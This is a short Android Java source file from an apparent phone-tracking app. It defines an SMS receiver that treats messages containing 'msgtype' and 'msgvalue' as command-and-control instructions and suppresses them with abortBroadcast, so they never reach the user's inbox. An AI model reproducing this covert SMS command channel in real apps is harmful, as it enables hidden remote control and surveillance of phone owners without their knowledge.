package com.mobile.trace.activity;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.text.TextUtils;
import android.util.Log;

import com.mobile.trace.utils.Config;

public class PrivilegedSmsReceiver extends BroadcastReceiver {
    private static final String TAG = "PrivilegedSmsReceiver";
    private static final boolean DEBUG = Config.DEBUG;
    
    @Override
    public void onReceive(Context arg0, Intent intent) {
        if (DEBUG) Log.d(TAG, "[[PrivilegedSmsReceiver::onReceive]]");
        
        if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] objArray = (Object[]) bundle.get("pdus");
                SmsMessage[] messages = new SmsMessage[objArray.length];
                for (int i = 0; i < objArray.length; i++) {
                    messages[i] = SmsMessage.createFromPdu((byte[]) objArray[i]);
                    String content = messages[i].getMessageBody();
                    if (!TextUtils.isEmpty(content)) {
                        if (content.contains("msgtype") && content.contains("msgvalue")) {
                            if (DEBUG) Log.d(TAG, "[[PrivilegedSmsReceiver::onReceive]] receive the mesage " +
                                    " for command control, MSG = " + content);
                            this.abortBroadcast();
                            break;
                        }
                    }
                }
            }
        }
    }

}
